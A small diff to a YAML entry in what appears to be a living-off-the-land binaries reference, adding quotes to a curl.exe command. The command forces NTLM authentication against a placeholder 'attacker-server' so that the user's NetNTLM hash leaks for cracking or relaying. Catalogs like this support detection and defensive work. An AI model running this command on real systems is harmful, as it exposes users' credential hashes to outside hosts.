@@ -31,7 +31,7 @@ Commands:
     OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
     Tags:
       - Execute: Pipeline
-  - Command: curl.exe -u : --ntlm http://attacker-server/
+  - Command: 'curl.exe -u : --ntlm http://attacker-server/'
     Description: Forces NTLM authentication using the current Windows user's context (via SSPI) against a remote server. This leaks the user's NetNTLM hash to the remote host.
     Usecase: Forced authentication to capture NetNTLM hashes for cracking or SMB relaying.
     Category: Credential Access
